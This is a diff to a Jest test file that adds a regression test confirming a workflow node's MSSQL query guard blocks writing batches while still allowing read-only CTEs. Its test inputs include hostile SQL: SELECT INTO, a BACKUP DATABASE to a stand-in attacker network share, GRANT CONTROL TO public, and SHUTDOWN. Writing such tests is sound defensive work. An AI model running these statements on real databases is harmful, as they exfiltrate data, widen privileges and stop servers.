@@ -32,6 +32,11 @@ jest.mock('../../electron/email/email-imap-flags', () => ({
   syncSeenFlagToServer: jest.fn().mockResolvedValue(undefined),
 }));
 
+const mockExecuteReadOnlyMssqlQuery = jest.fn();
+jest.mock('../../electron/mssql-keytar-service', () => ({
+  executeReadOnlyMssqlQuery: (...args: unknown[]) => mockExecuteReadOnlyMssqlQuery(...args),
+}));
+
 import {
   addMessageTag,
   clearMessageSeenSyncPending,
@@ -228,7 +233,33 @@ describe('workflow builtin nodes', () => {
       defs.get('mssql.query')!.execute(ctx(), { sql: 'DELETE FROM Kunden' }, 'sql'),
     ).resolves.toMatchObject({
       status: 'error',
-      message: expect.stringContaining('Nur SELECT erlaubt'),
+      message: 'Query muss mit SELECT oder WITH beginnen',
     });
+  });
+
+  // C-A76: the desktop mssql.query guard let SELECT … INTO, BACKUP and GRANT batches reach MSSQL.
+  test('mssql.query rejects writing batches before MSSQL and still runs read-only CTEs', async () => {
+    const mssql = collect(registerIntegrationNodes).get('mssql.query')!;
+    mockExecuteReadOnlyMssqlQuery.mockResolvedValue({ success: true, rows: [{ ok: 1 }], rowCount: 1 });
+
+    for (const sql of [
+      'SELECT * INTO dbo.pwned FROM dbo.tKunde',
+      "SELECT 1; BACKUP DATABASE eazybusiness TO DISK='\\\\attacker\\share\\x.bak'",
+      'SELECT 1; GRANT CONTROL TO public',
+      'SELECT 1; SHUTDOWN',
+    ]) {
+      await expect(mssql.execute(ctx({ dryRun: false }), { sql }, 'sql')).resolves.toEqual({
+        status: 'error',
+        message: 'Nur lesende SELECT-Abfragen sind erlaubt',
+      });
+    }
+    expect(mockExecuteReadOnlyMssqlQuery).not.toHaveBeenCalled();
+
+    const cte = 'WITH x AS (SELECT 1 AS ok) SELECT ok FROM x';
+    await expect(mssql.execute(ctx({ dryRun: false }), { sql: cte }, 'sql')).resolves.toMatchObject({
+      status: 'ok',
+      variables: { 'mssql.row_count': 1 },
+    });
+    expect(mockExecuteReadOnlyMssqlQuery).toHaveBeenCalledWith(cte);
   });
 });
